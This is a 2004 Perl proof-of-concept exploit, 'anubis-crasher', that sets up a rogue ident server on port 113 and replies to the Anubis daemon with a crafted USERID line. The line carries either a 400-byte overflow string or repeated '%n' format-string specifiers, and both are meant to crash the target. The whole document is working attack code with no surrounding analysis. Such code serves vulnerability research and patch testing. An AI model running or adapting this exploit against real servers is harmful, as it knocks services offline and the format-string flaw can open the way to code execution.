#!/usr/bin/perl --

# anubis-crasher
# Ulf Harnhammar 2004
# I hereby place this program in the Public Domain.

use IO::Socket;


sub usage()
{
  die "usage: $0 type\n".
      "type is 'a' (buffer overflow) or 'b' (format string bug).\n";
} # sub usage


$port = 113;

usage() unless @ARGV == 1;
$type = shift;
usage() unless $type =~ m|^[ab]$|;

$send{'a'} = 'U' x 400;
$send{'b'} = '%n' x 28;
$sendstr = $send{$type};

$server = IO::Socket::INET->new(Proto => 'tcp',
                                LocalPort => $port,
                                Listen => SOMAXCONN,
                                Reuse => 1) or
          die "can't create server: $!";

while ($client = $server->accept())
{
  $client->autoflush(1);
  print "got a connection\n";

  $input = <$client>;
  $input =~ tr/\015\012//d;
  print "client said $input\n";

#  $wait = <STDIN>;
#  $wait = 'be quiet, perl -wc';

  $output = "a: USERID: a:$sendstr";
  print $client "$output\n";
  print "I said $output\n";

  close $client;
  print "disconnected\n";
} # while client=server->accept


